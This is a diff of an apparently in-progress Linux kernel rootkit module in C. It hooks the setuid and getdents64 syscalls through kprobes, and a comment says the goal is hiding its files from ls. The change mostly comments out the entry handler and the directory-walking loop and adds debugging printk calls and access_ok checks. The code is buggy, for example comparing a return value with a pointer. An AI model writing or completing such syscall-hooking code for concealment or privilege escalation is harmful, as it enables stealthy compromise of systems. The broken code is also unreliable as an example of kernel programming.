@@ -52,7 +52,7 @@ void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsi
 /* Hiding our files from ls */
 
 /* struct for info to be passed from entry handler to post handler */
-static struct getdents_data{
+/*static struct getdents_data{
     struct linux_dirent64 *dirent_buf;
     int count;
     int skip_file;
@@ -70,49 +70,74 @@ static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, str
 	return 0;
 }
 
+*/
 static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 
 	printk(KERN_INFO "executing __x64_sys_getdents64_post_handler");
 	struct linux_dirent64 __user *dentry_data=(struct linux_dirent64 *)regs->si;
 
+	ssize_t ret = regs_return_value(regs);
+	int dirfd=regs->di;
+	unsigned long count=regs->dx;
+
+	if(dirfd<0)
+		printk(KERN_ERR "conductor...we have a problem");
+
+	printk(KERN_INFO "getdents called with fd: %d and count %lx",regs->di,count);
 	struct linux_dirent64 *current_dir,*dirent_ker=NULL;
 	unsigned long offset = 0;
 
 
-	ssize_t ret = regs_return_value(regs);
 	printk(KERN_INFO "getdents returned %d bytes", ret);
 
 	if(ret<=(struct linux_dirent64 *)regs->dx){
 		printk(KERN_DEBUG "ret is less than count");
 	}
+	
 	char *kbuf=kzalloc(ret,GFP_KERNEL);
 	if(!kbuf)
 		printk(KERN_ERR "couldn't allocate mem");
-
 	printk(KERN_DEBUG "mem allocated: %ld bytes",ret);
+
+
+	//dentrydata debugging
+	if((unsigned long)dentry_data>=TASK_SIZE){
+		printk("why is dentry data in kernel space");
+		return -EFAULT;
+	}
+	if(!dentry_data){
+		printk(KERN_ERR "dentry data null");
+		return -EFAULT;
+	}
+
 
 	if( (ret<=0) || (kbuf == NULL) )
 		return ret;
-
-
-	long error = copy_from_user(kbuf,dentry_data->d_name,ret);
+//access_ok(dentry_data,ret) breaks this
+	if(access_ok(dentry_data->d_name,ret)){
+		printk(KERN_DEBUG "acces is ok ");
+	}
+	else{
+		printk(KERN_DEBUG "access not ok");
+	}
+	
+	/*
+	long error = copy_from_user(kbuf,dentry_data,ret);
 	if(error){
 		printk(KERN_ERR "could not copy %ld bytes from user",ret);
 		printk(KERN_ERR "copy_from_user error: %ld",error);
 	}
 
-/*
 	while(offset<ret){
 		current_dir = (void *)kbuf+offset;
-		dentry_data.d_name_ptr=(unsigned long)(unsigned char *)dirent->d_name;
-		printk(KERN_INFO "dentry_data->d_name_ptr is: %l", dentry_data);
-		return 0;
+		printk(KERN_INFO "d_name of the current dir is: %l", current_dir->d_name);
+
+		offset+=current_dir->d_reclen;
 	}
 
-		if(dentry_data.skip_file){
-			printk(KERN_DEBUG "rootkit found: ");
-		}
+//	error=copy_to_user(dentry_data,kbuf,ret);
 */
+
 		return 0;
 }
 
